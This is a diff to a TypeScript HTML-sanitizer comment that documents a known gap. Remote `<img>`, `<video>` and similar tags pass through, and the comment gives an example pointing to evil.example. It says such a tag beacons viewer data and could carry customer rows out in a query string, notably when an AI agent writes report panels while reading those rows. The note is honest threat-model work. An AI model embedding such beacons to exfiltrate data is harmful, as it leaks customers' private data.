@@ -145,6 +145,24 @@ const escapeHtml = (text: string) =>
  * output cannot execute script, navigate to a `javascript:` URL, restyle the
  * application, or collect input. It is not a claim that arbitrary HTML round-trips.
  *
+ * **And one thing it deliberately does NOT stop: remote subresource loads.**
+ * `<img src="https://evil.example/x.gif">` passes through untouched, and so do
+ * `<video>`, `<audio>`, `<source srcset>` and `<track>` (measured; `<link>`, `<object>`
+ * and `<input type="image">` do not survive). Every render of the APPLIED report then
+ * beacons the viewer's IP and user-agent to that origin, with a path the author chose —
+ * enough to carry a row of the customer's own data out in a query string. No malicious
+ * user is needed: the agent writes the panel and reads customer rows while doing it.
+ *
+ * It is listed rather than blocked because blocking it means refusing `<img>`, which
+ * legitimate panels use, and because a sanitizer is the wrong layer for it. The control
+ * that closes it is a CSP on the DOCUMENT, which this deployment does not have: nginx
+ * serves the frontend with `Content-Security-Policy: frame-ancestors *` and nothing
+ * else, and the `img-src 'self' data: https:` helmet sets rides on the BACKEND's own
+ * responses — it never reaches this page, and would allow any https origin if it did.
+ * A follow-up worth filing, and the reason this paragraph exists in the meantime:
+ * a threat model that lists only its wins is not a threat model.
+ * (!64 review round 5, finding 3)
+ *
  * Fails CLOSED. Without a DOM (a non-browser runtime, a test outside jsdom)
  * DOMPurify cannot sanitize and reports `isSupported: false` — in that case the
  * content is escaped to text rather than passed through, because silently returning
